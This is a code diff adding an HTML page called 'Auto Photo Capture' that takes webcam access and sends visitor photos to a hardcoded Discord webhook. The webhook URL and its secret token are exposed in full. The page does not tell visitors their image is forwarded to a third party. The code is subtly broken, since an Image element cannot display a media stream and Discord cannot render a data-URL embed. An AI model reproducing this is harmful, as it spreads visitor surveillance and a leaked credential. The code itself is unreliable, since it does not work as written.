@@ -1,1 +1,63 @@
-.
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Photo Capture</title>
+    <script>
+        function capturePhoto() {
+            // Create a new image element
+            var img = new Image();
+
+            // Set the source of the image to the user's webcam
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    img.srcObject = stream;
+                    document.body.appendChild(img);
+                })
+                .catch(function (error) {
+                    console.log('Error accessing webcam:', error);
+                });
+        }
+
+        function sendPhoto() {
+            // Get the captured photo from the image element
+            var img = document.querySelector('img');
+
+            // Convert the image to base64 data URL
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+            context.drawImage(img, 0, 0);
+            var dataUrl = canvas.toDataURL();
+
+            // Send the photo via Discord webhook
+            var webhookUrl = 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX';
+            var payload = {
+                content: 'New visitor photo',
+                embeds: [{
+                    image: {
+                        url: dataUrl
+                    }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+                .then(function (response) {
+                    console.log('Photo sent successfully');
+                })
+                .catch(function (error) {
+                    console.log('Error sending photo:', error);
+                });
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to Auto Photo Capture</h1>
+    <button onclick="capturePhoto()">Capture Photo</button>
+    <button onclick="sendPhoto()">Send Photo</button>
+</body>
+</html>
